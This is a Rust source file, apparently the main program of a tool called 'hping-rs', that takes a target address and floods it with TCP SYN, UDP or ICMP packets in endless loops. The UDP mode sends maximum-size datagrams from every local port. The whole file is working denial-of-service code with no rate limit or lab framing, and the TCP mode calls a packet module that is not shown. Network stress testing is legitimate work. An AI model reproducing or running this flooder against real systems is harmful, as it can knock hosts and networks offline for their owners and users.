pub mod route;

use icmp;
use route::tcp::packet::send_tcp_packets;
use std::env;
use std::io;
use std::net::IpAddr;
use std::net::Ipv4Addr;
use tokio::net::UdpSocket;

#[tokio::main]
async fn main() -> io::Result<()> {
    let args: Vec<_> = env::args().collect();

    if args.len() <= 2 {
        println!(
            "usage: \n
            UDP : ./hping-rs udp ip:port \n
            TCP : ./hping-rs tcp ip \n
            ICMP : ./hping-rs icmp ip
            "
        );
        panic!();
    }

    let method = args[1].to_string();
    let host = args[2].to_string();

    let buf = [1; 65507];

    match method.as_str() {
        "tcp" => {
            let interface = String::from("enp2s0");

            println!("start TCP SYN flooding!");

            send_tcp_packets(host.parse::<Ipv4Addr>().unwrap(), interface);
        }
        "udp" => {
            println!("start UDP flooding!");
            loop {
                for i in 1..65535 {
                    let sock = UdpSocket::bind(format!("0.0.0.0:{}", i)).await;

                    match sock {
                        Err(_e) => continue,
                        Ok(sock) => {
                            let _result = sock.send_to(&buf, &host).await;
                        }
                    }
                }
            }
        }
        "icmp" => {
            let split: Vec<&str> = host.split(".").collect();
            println!("start ICMP flooding!");

            let localhost_v4 = IpAddr::V4(Ipv4Addr::new(
                split[0].parse().unwrap(),
                split[1].parse().unwrap(),
                split[2].parse().unwrap(),
                split[3].parse().unwrap(),
            ));

            let ping = icmp::IcmpSocket::connect(localhost_v4);
            let mut ping = ping.unwrap();

            let payload: &[u8] = &[1, 2];

            loop {
                let _ = ping.send(payload);
            }
        }
        _ => println!("invaild method!"),
    }

    Ok(())
}
